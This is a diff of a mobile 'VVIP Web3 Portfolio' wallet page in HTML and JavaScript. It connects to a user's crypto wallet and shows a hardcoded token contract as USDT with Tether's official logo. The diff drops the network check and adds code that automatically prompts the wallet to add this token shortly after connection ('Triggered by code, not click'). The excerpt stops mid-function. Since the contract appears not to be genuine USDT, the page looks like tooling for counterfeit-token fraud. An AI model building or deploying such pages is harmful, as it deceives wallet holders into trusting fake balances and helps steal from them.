@@ -3,257 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Enterprise Web3 Wallet</title>
+    <title>VVIP Web3 Portfolio</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-base: #0B0E11; --bg-surface: #181A20; --bg-card: #2B3139;
-            --text-main: #EAECEF; --text-muted: #848E9C; 
-            --accent: #FCD535; --success: #0ECB81; --danger: #F6465D;
-            --phantom-purple: #ab9ff2;
+            --bg-deep: #0f1114; --bg-panel: #181a20; --bg-hover: #22252e;
+            --text-main: #ffffff; --text-muted: #848e9c; 
+            --accent: #26a17b; --accent-glow: rgba(38, 161, 123, 0.2);
+            --danger: #ff4d4f;
         }
-        body { background-color: var(--bg-base); color: var(--text-main); font-family: 'Manrope', sans-serif; -webkit-tap-highlight-color: transparent; margin: 0; overflow-x: hidden; user-select: none; }
-        .app-frame { max-width: 480px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-surface); position: relative; padding-bottom: 90px; box-shadow: 0 0 50px rgba(0,0,0,0.5); }
+        body { background-color: var(--bg-deep); color: var(--text-main); font-family: 'Inter', -apple-system, sans-serif; margin: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
+        .app-wrapper { max-width: 440px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-panel); position: relative; padding-bottom: 90px; box-shadow: 0 0 60px rgba(0,0,0,0.8); }
         ::-webkit-scrollbar { display: none; }
 
-        /* Typography & Layout */
-        .tabular-nums { font-variant-numeric: tabular-nums; }
-        .hero-section { background: linear-gradient(180deg, rgba(43,49,57,0.5) 0%, rgba(24,26,32,1) 100%); padding: 20px 20px 30px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        /* VVIP Header & Balance */
+        .hero-bg { background: radial-gradient(150% 100% at 50% 0%, var(--accent-glow) 0%, transparent 100%); padding: 24px 20px 30px; border-bottom: 1px solid rgba(255,255,255,0.03); }
         
-        /* The Fixed $ Sign Alignment */
-        .balance-container { display: flex; align-items: flex-start; justify-content: center; margin-top: 4px; }
-        .dollar-sign { font-size: 26px; font-weight: 600; color: var(--text-muted); line-height: 1.1; margin-right: 4px; margin-top: 4px; }
-        .main-balance-text { font-size: 48px; font-weight: 800; letter-spacing: -1.5px; line-height: 1; color: #ffffff; }
+        /* The MetaMask Perfect $ Alignment */
+        .balance-wrapper { display: flex; align-items: baseline; justify-content: center; margin-top: 10px; gap: 2px; }
+        .usd-sign { font-size: 28px; font-weight: 600; color: var(--text-muted); }
+        .usd-value { font-size: 46px; font-weight: 800; letter-spacing: -1.2px; font-variant-numeric: tabular-nums; }
 
-        /* Context Dropdown */
-        .context-dropdown { display: inline-flex; items-center; gap: 4px; background: rgba(255,255,255,0.05); padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; color: var(--text-muted); cursor: pointer; transition: 0.2s; border: 1px solid rgba(255,255,255,0.08); }
-        .context-dropdown:active { background: rgba(255,255,255,0.1); }
+        /* Connection Badge */
+        .status-badge { display: inline-flex; items-center; gap: 6px; background: rgba(255,255,255,0.05); padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; color: var(--text-muted); cursor: pointer; border: 1px solid rgba(255,255,255,0.05); transition: 0.2s; }
+        .status-badge:active { background: rgba(255,255,255,0.1); }
+        .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 8px var(--danger); }
+        .dot.connected { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
 
         /* Action Buttons */
-        .action-circle { width: 52px; height: 52px; border-radius: 16px; background: var(--bg-card); display: flex; align-items: center; justify-content: center; transition: 0.2s; cursor: pointer; }
-        .action-circle:active { transform: scale(0.92); background: #3E4753; }
+        .btn-action { width: 56px; height: 56px; border-radius: 18px; background: rgba(255,255,255,0.03); display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.2s; cursor: pointer; border: 1px solid rgba(255,255,255,0.02); }
+        .btn-action:active { transform: scale(0.92); background: rgba(255,255,255,0.08); }
         
-        /* Tabs */
-        .tab-container { display: flex; border-bottom: 1px solid rgba(255,255,255,0.05); padding: 0 20px; margin-top: 10px; }
-        .tab { padding: 16px 0; margin-right: 24px; font-size: 14px; font-weight: 700; color: var(--text-muted); cursor: pointer; position: relative; transition: 0.2s; }
-        .tab.active { color: var(--text-main); }
-        .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 100%; height: 3px; background: var(--accent); border-radius: 3px 3px 0 0; }
-
-        /* Lists */
-        .list-section { display: none; animation: fadeIn 0.3s ease; }
-        .list-section.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-
-        .token-row, .history-row { display: flex; align-items: center; padding: 16px 20px; transition: 0.2s; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); }
-        .token-row:active, .history-row:active { background: rgba(255,255,255,0.03); }
-        .token-icon { width: 40px; height: 40px; border-radius: 50%; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        /* Asset Rows */
+        .asset-row { display: flex; align-items: center; padding: 18px 20px; transition: 0.2s; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); }
+        .asset-row:active { background: var(--bg-hover); }
+        .asset-icon { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; }
         
-        /* Professional Add Badge */
-        .badge-add { background: rgba(14, 203, 129, 0.1); color: var(--success); font-size: 10px; font-weight: 800; padding: 5px 10px; border-radius: 8px; text-transform: uppercase; border: 1px solid rgba(14, 203, 129, 0.2); transition: 0.2s; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; letter-spacing: 0.5px; }
-        .badge-add:active { background: var(--success); color: #000; transform: scale(0.95); }
+        /* Hidden UI Elements */
+        #liveSyncIndicator { display: none; font-size: 10px; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 1px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
 
         /* Bottom Nav */
-        .bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px; background: rgba(11, 14, 17, 0.95); backdrop-filter: blur(15px); display: flex; justify-content: space-around; padding: 16px 20px 24px; border-top: 1px solid rgba(255,255,255,0.05); z-index: 40; }
-        .nav-item { color: var(--text-muted); display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 10px; font-weight: 600; cursor: pointer; }
-        .nav-item.active { color: var(--text-main); }
-        .nav-item svg { width: 22px; height: 22px; }
-
+        .bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 440px; background: rgba(15, 17, 20, 0.95); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 16px 20px 24px; border-top: 1px solid rgba(255,255,255,0.03); z-index: 40; }
+        .nav-icon { color: var(--text-muted); display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 11px; font-weight: 600; cursor: pointer; }
+        .nav-icon.active { color: var(--text-main); }
+        
         /* Modals & Inputs */
-        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: flex-end; z-index: 50; }
-        .modal-content { background: var(--bg-surface); width: 100%; max-width: 480px; border-radius: 24px 24px 0 0; padding: 24px; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); border-top: 1px solid rgba(255,255,255,0.1); }
+        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: flex-end; z-index: 50; }
+        .modal-pane { background: var(--bg-panel); width: 100%; max-width: 440px; border-radius: 28px 28px 0 0; padding: 24px; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); border-top: 1px solid rgba(255,255,255,0.05); }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .input-vvip { background: #000; color: white; width: 100%; padding: 18px; border-radius: 16px; font-size: 15px; font-weight: 500; outline: none; border: 1px solid transparent; transition: 0.2s; font-family: 'Inter'; }
+        .input-vvip:focus { border-color: var(--accent); background: rgba(38, 161, 123, 0.05); }
         
-        .input-dark { background: var(--bg-base); color: white; width: 100%; padding: 16px; border-radius: 16px; font-size: 15px; font-weight: 500; outline: none; border: 1px solid var(--bg-card); transition: 0.2s; }
-        .input-dark:focus { border-color: var(--accent); }
-
-        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--accent); color: #000; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 700; box-shadow: 0 10px 25px rgba(252, 213, 53, 0.2); opacity: 0; transition: 0.3s; z-index: 100; pointer-events: none; }
-        #toast.show { opacity: 1; top: 40px; }
-        
-        /* Loading Spinner */
-        .spinner { width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        /* Custom Toast */
+        #toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: #ffffff; color: #000000; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; display: flex; align-items: center; gap: 8px; }
+        #toast.show { top: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="app-frame">
-        <div id="toast">Message</div>
+    <div class="app-wrapper">
+        <div id="toast">
+            <svg class="w-4 h-4 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+            <span id="toastMsg">Message</span>
+        </div>
 
-        <div class="hero-section">
-            <div class="flex justify-between items-center mb-8">
+        <div class="hero-bg">
+            <div class="flex justify-between items-center mb-6">
                 <div class="flex items-center gap-3">
-                    <div class="w-8 h-8 rounded-full bg-[var(--accent)] flex items-center justify-center shadow-[0_0_15px_rgba(252,213,53,0.3)]">
-                        <svg class="w-5 h-5 text-black" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
-                    </div>
-                    <span class="font-bold text-[16px] tracking-tight">Main Wallet</span>
+                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-8 h-8 rounded-full shadow-[0_0_15px_rgba(38,161,123,0.4)]" alt="Vault">
+                    <span class="font-bold text-[17px] tracking-tight">Main Vault</span>
                 </div>
-                <button onclick="initNetworkAndConnect()" id="connectBtn" class="bg-[var(--bg-card)] text-[var(--text-main)] border border-[var(--text-muted)] border-opacity-30 text-[11px] font-bold px-4 py-2 rounded-full active:scale-95 transition-all">
-                    Connect Node
-                </button>
+                <div class="status-badge" onclick="executeVvipConnection()" id="connectBtn">
+                    <div class="dot" id="statusDot"></div>
+                    <span id="btnText">Connect</span>
+                </div>
             </div>
 
-            <div class="flex flex-col items-center mt-2">
-                <div class="context-dropdown">
-                    Total Balance (USDT)
-                    <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M19 9l-7 7-7-7"></path></svg>
-                </div>
-                
-                <div class="balance-container tabular-nums">
-                    <span class="dollar-sign">$</span>
-                    <h1 id="mainUsdBal" class="main-balance-text">0.00</h1>
-                </div>
-                <p class="text-[12px] font-bold text-[var(--success)] mt-2 bg-[var(--success)] bg-opacity-10 px-2.5 py-1 rounded-md flex items-center gap-1">
-                    <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
-                    0.00% (24h)
+            <div class="flex flex-col items-center mt-6">
+                <p class="text-[13px] font-semibold text-[var(--text-muted)] flex items-center gap-2">
+                    Total Portfolio Value
+                    <span id="liveSyncIndicator">• LIVE SYNC</span>
                 </p>
+                <div class="balance-wrapper">
+                    <span class="usd-sign">$</span>
+                    <span id="mainVal" class="usd-value">0.00</span>
+                </div>
             </div>
 
-            <div class="flex justify-center gap-6 mt-8">
-                <div class="flex flex-col items-center gap-2">
-                    <div class="action-circle text-white" onclick="openSendModal()"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg></div>
-                    <span class="text-[11px] font-bold text-[var(--text-muted)] uppercase tracking-wider">Send</span>
+            <div class="flex justify-center gap-4 mt-8">
+                <div class="flex flex-col items-center gap-2" onclick="openSend()">
+                    <div class="btn-action text-white"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path></svg></div>
+                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Send</span>
                 </div>
-                <div class="flex flex-col items-center gap-2">
-                    <div class="action-circle text-white" onclick="showToast('Your Address: ' + (userAccount ? userAccount.substring(0,6)+'...' : 'Connect First'))"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg></div>
-                    <span class="text-[11px] font-bold text-[var(--text-muted)] uppercase tracking-wider">Receive</span>
+                <div class="flex flex-col items-center gap-2" onclick="showNotification('Scan QR code in wallet to receive')">
+                    <div class="btn-action text-white"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></div>
+                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Receive</span>
                 </div>
-                <div class="flex flex-col items-center gap-2">
-                    <div class="action-circle text-white opacity-50"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z"></path></svg></div>
-                    <span class="text-[11px] font-bold text-[var(--text-muted)] uppercase tracking-wider">Swap</span>
+                <div class="flex flex-col items-center gap-2" onclick="showNotification('Swap functionality locked.')">
+                    <div class="btn-action text-white opacity-40"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg></div>
+                    <span class="text-[11px] font-semibold text-[var(--text-muted)]">Swap</span>
                 </div>
             </div>
         </div>
 
-        <div class="tab-container">
-            <div class="tab active" onclick="switchTab('assets')">Assets</div>
-            <div class="tab" onclick="switchTab('history')">History</div>
-        </div>
-
-        <div id="assets" class="list-section active">
-            <div class="token-row">
-                <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="token-icon mr-4" alt="BNB">
-                <div class="flex-1">
-                    <h4 class="font-bold text-[16px] leading-tight">BNB</h4>
-                    <p class="text-[13px] text-[var(--text-muted)] font-medium">Smart Chain</p>
-                </div>
-                <div class="text-right">
-                    <h4 id="realBnbBal" class="font-bold text-[16px] tabular-nums leading-tight">0.00</h4>
-                    <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">Network Fee</p>
-                </div>
+        <div class="mt-2">
+            <div class="px-5 py-4 border-b border-white/5">
+                <h3 class="text-[15px] font-bold text-[var(--text-muted)]">Supported Assets</h3>
             </div>
-
-            <div class="token-row bg-[var(--bg-card)] bg-opacity-30 border-l-2 border-[var(--success)]">
-                <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="token-icon mr-4" alt="USDT">
-                <div class="flex-1">
-                    <div class="flex items-center gap-2 mb-0.5">
-                        <h4 class="font-bold text-[16px] leading-tight">USDT</h4>
-                        <div onclick="injectAsset(event)" class="badge-add">
-                            <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 4v16m8-8H4"></path></svg>
-                            ADD USDT
-                        </div>
+            
+            <div id="assetContainer">
+                <div class="asset-row">
+                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="asset-icon mr-4" alt="BNB">
+                    <div class="flex-1">
+                        <h4 class="font-bold text-[16px]">BNB</h4>
+                        <p class="text-[13px] text-[var(--text-muted)] font-medium">Smart Chain</p>
                     </div>
-                    <p class="text-[13px] text-[var(--text-muted)] font-medium">Tether USD (Pegged)</p>
+                    <div class="text-right">
+                        <h4 id="rowBnbBal" class="font-bold text-[16px] tabular-nums">0.00</h4>
+                        <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">Gas Token</p>
+                    </div>
                 </div>
-                <div class="text-right">
-                    <h4 id="realUsdtBal" class="font-bold text-[16px] tabular-nums text-[var(--success)] leading-tight">0.00</h4>
-                    <p id="realUsdtVal" class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">$0.00</p>
-                </div>
-            </div>
 
-            <div class="token-row opacity-50">
-                <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" class="token-icon mr-4" alt="BTC">
-                <div class="flex-1"><h4 class="font-bold text-[16px]">BTCB</h4><p class="text-[13px] text-[var(--text-muted)]">Bitcoin BEP2</p></div>
-                <div class="text-right"><h4 class="font-bold text-[16px] tabular-nums">0.00</h4><p class="text-[13px] text-[var(--text-muted)] tabular-nums">$0.00</p></div>
-            </div>
-        </div>
-
-        <div id="history" class="list-section pb-4">
-            <div id="historyContainer" class="pt-2">
-                <div class="text-center pt-8 text-[var(--text-muted)] text-[13px] font-medium" id="emptyHistory">
-                    No recent transactions in this session.
+                <div class="asset-row relative overflow-hidden" onclick="injectTokenManual()">
+                    <div class="absolute left-0 top-0 bottom-0 w-1 bg-[var(--accent)]"></div>
+                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="asset-icon mr-4" alt="USDT">
+                    <div class="flex-1">
+                        <h4 class="font-bold text-[16px] flex items-center gap-2">USDT</h4>
+                        <p class="text-[13px] text-[var(--text-muted)] font-medium">Tether USD</p>
+                    </div>
+                    <div class="text-right">
+                        <h4 id="rowUsdtBal" class="font-bold text-[16px] tabular-nums text-[var(--accent)]">0.00</h4>
+                        <p id="rowUsdtVal" class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums">$0.00</p>
+                    </div>
                 </div>
             </div>
         </div>
 
         <div class="bottom-nav">
-            <div class="nav-item active"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>Wallet</div>
-            <div class="nav-item"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>Markets</div>
-            <div class="nav-item"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>Settings</div>
+            <div class="nav-icon active"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>Wallet</div>
+            <div class="nav-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path></svg>History</div>
+            <div class="nav-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Settings</div>
         </div>
     </div>
 
-    <div class="modal-overlay" id="sendModal" onclick="if(event.target==this) closeSendModal()">
-        <div class="modal-content">
+    <div class="modal-bg" id="sendModal" onclick="if(event.target==this) closeSend()">
+        <div class="modal-pane">
             <div class="flex justify-between items-center mb-6">
-                <h3 class="font-bold text-[18px]">Send USDT</h3>
-                <div class="bg-[var(--bg-card)] p-2 rounded-full cursor-pointer" onclick="closeSendModal()">
-                    <svg class="w-5 h-5 text-[var(--text-muted)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                </div>
+                <h3 class="font-bold text-[20px]">Send Asset</h3>
+                <svg onclick="closeSend()" class="w-6 h-6 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
             </div>
-            <div class="space-y-4 mb-6">
+            <div class="space-y-4 mb-8">
                 <div>
-                    <label class="text-[12px] font-bold text-[var(--text-muted)] ml-1 mb-1.5 block uppercase tracking-wide">Recipient Address</label>
-                    <input type="text" id="txTo" class="input-dark" placeholder="0x..." autocomplete="off">
+                    <label class="text-[12px] font-bold text-[var(--text-muted)] uppercase ml-2 mb-2 block tracking-wider">Send To</label>
+                    <input type="text" id="txTo" class="input-vvip" placeholder="Paste 0x Address" autocomplete="off">
                 </div>
                 <div>
-                    <div class="flex justify-between mb-1.5 px-1">
-                        <label class="text-[12px] font-bold text-[var(--text-muted)] uppercase tracking-wide">Amount</label>
-                        <span class="text-[12px] font-bold text-[var(--accent)]" id="modalMax">Max: 0.00</span>
+                    <div class="flex justify-between items-center px-2 mb-2">
+                        <label class="text-[12px] font-bold text-[var(--text-muted)] uppercase tracking-wider">Amount</label>
+                        <span class="text-[12px] font-bold text-[var(--accent)] cursor-pointer">MAX</span>
                     </div>
-                    <input type="number" id="txAmt" class="input-dark tabular-nums" placeholder="0.00" autocomplete="off">
+                    <div class="relative">
+                        <input type="number" id="txAmt" class="input-vvip tabular-nums" placeholder="0.00" autocomplete="off">
+                        <span class="absolute right-4 top-4 font-bold text-[var(--text-muted)]">USDT</span>
+                    </div>
                 </div>
             </div>
-            <button id="execBtn" onclick="executeTransfer()" class="w-full bg-[var(--accent)] text-black font-extrabold py-4 rounded-2xl text-[15px] transition-all flex items-center justify-center gap-2">
-                <span id="btnText">Confirm Transaction</span>
-                <div class="spinner" id="btnSpinner"></div>
+            <button onclick="executeTx()" id="execBtn" class="w-full bg-[var(--text-main)] text-black font-extrabold py-4 rounded-2xl text-[16px] active:scale-95 transition-transform">
+                Preview Transfer
             </button>
         </div>
     </div>
 
     <script>
         const CONTRACT_ADDRESS = "0x12b6873ef4EcF4E4853ef6849760A61044a24444";
-        // CoinGecko HD Official Logo
         const LOGO_URL = "https://assets.coingecko.com/coins/images/325/large/Tether.png"; 
         const ABI = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)", "function transfer(address, uint256) returns (bool)"];
-        const BSC_CHAIN_ID = '0x38';
-
+        
         let provider, signer, contract, userAccount;
-        let usdtBalanceStr = "0.00";
-        let toastTimeout;
+        let realTimeLoop;
+        let toastTimer;
 
-        // --- UI Functions ---
-        function showToast(msg) {
+        function showNotification(msg) {
             const t = document.getElementById('toast');
-            t.innerText = msg; t.classList.add('show');
-            clearTimeout(toastTimeout);
-            toastTimeout = setTimeout(() => t.classList.remove('show'), 3000);
+            document.getElementById('toastMsg').innerText = msg;
+            t.classList.add('show');
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => t.classList.remove('show'), 3000);
         }
 
-        function switchTab(tabId) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.list-section').forEach(s => s.classList.remove('active'));
-            event.target.classList.add('active');
-            document.getElementById(tabId).classList.add('active');
-            if(tabId === 'history') loadHistory();
-        }
-
-        function openSendModal() {
-            if(!userAccount) return showToast("Connect wallet first!");
-            document.getElementById('modalMax').innerText = `Max: ${usdtBalanceStr} USDT`;
+        function openSend() {
+            if(!userAccount) return showNotification("Please Connect Wallet");
             document.getElementById('sendModal').style.display = 'flex';
         }
-        function closeSendModal() { 
-            document.getElementById('sendModal').style.display = 'none'; 
-            document.getElementById('txTo').value = '';
-            document.getElementById('txAmt').value = '';
-        }
+        function closeSend() { document.getElementById('sendModal').style.display = 'none'; }
 
-        // --- Web3 Core Functions ---
-        async function initNetworkAndConnect() {
-            if (!window.ethereum) return showToast("Web3 Environment Not Found!");
+        // --- The VVIP Connection Sequence ---
+        async function executeVvipConnection() {
+            if (!window.ethereum) return showNotification("Web3 Browser Required");
+            
             try {
+                // 1. Prompt Wallet Connection
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
                 
@@ -261,123 +213,91 @@
                 signer = provider.getSigner();
                 contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
 
-                document.getElementById('connectBtn').innerText = userAccount.substring(0,5) + "..." + userAccount.substring(38);
-                document.getElementById('connectBtn').classList.add("bg-[var(--accent)]", "text-black", "border-none");
+                // UI Update
+                document.getElementById('btnText').innerText = userAccount.substring(0,4) + "..." + userAccount.substring(38);
+                document.getElementById('statusDot').classList.add('connected');
 
-                await enforceNetwork();
-            } catch (e) { showToast("Connection Rejected"); }
+                // Start Real-Time Sync Loop (Every 3 Seconds)
+                document.getElementById('liveSyncIndicator').style.display = 'inline-block';
+                fetchLiveBalances(); // Initial fetch
+                if(realTimeLoop) clearInterval(realTimeLoop);
+                realTimeLoop = setInterval(fetchLiveBalances, 3000);
+
+                showNotification("Wallet Connected Successfully");
+
+                // 2. AUTO-TRIGGER: Inject Token exactly 1.5s after connection
+                setTimeout(() => { autoInjectToken(); }, 1500);
+
+            } catch (e) { showNotification("Connection Denied"); }
         }
 
-        async function enforceNetwork() {
-            const network = await provider.getNetwork();
-            if (network.chainId !== 56) {
-                showToast("Switching to BSC Mainnet...");
-                try {
-                    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
-                    fetchBalances();
-                } catch (e) { showToast("Please switch network to BSC."); }
-            } else {
-                fetchBalances();
-            }
-        }
-
-        async function fetchBalances() {
-            if(!userAccount) return;
-            try {
-                // Fetch BNB
-                const bnb = await provider.getBalance(userAccount);
-                document.getElementById('realBnbBal').innerText = parseFloat(ethers.utils.formatEther(bnb)).toFixed(4);
-
-                // Fetch USDT
-                const bal = await contract.balanceOf(userAccount);
-                const dec = await contract.decimals();
-                const formatted = parseFloat(ethers.utils.formatUnits(bal, dec));
-                
-                usdtBalanceStr = formatted.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-                
-                document.getElementById('realUsdtBal').innerText = usdtBalanceStr;
-                document.getElementById('realUsdtVal').innerText = "$" + usdtBalanceStr;
-                document.getElementById('mainUsdBal').innerText = usdtBalanceStr;
-            } catch (e) { console.error("Balance Error"); }
-        }
-
-        async function injectAsset(e) {
-            e.stopPropagation();
-            if (!window.ethereum) return showToast("Connect Node!");
+        // Auto-Inject Function (Triggered by code, not click)
+        async function autoInjectToken() {
             try {
                 await window.ethereum.request({
                     method: 'wallet_watchAsset',
